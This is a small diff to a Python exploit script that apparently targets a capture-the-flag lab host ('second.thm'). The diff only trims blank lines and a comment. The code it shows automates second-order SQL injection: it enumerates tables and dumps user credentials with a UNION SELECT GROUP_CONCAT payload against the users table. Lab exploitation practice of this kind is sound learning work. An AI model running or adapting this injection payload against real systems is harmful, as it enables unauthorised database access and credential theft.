@@ -2,9 +2,7 @@ import requests
 import uuid
 import re
 
-
 base_url="http://second.thm:8000"
-
 
 def second_sql(payload):
     ### Creating a unique uuid to avoid same email
@@ -44,6 +42,6 @@ if __name__=="__main__":
     print(f"    Tables: {tables}\n")
 
     print("[+] 3. Dumping User Credentials...")
-    # Using CONCAT_WS (Concatenate With Separator) for clean formatting
+    # Using CONCAT_WS 
     credentials = second_sql("' UNION SELECT 1, GROUP_CONCAT(CONCAT_WS(':', username, password)), 3, 4 FROM users-- ")
     print(f"    Credentials: {credentials}\n")
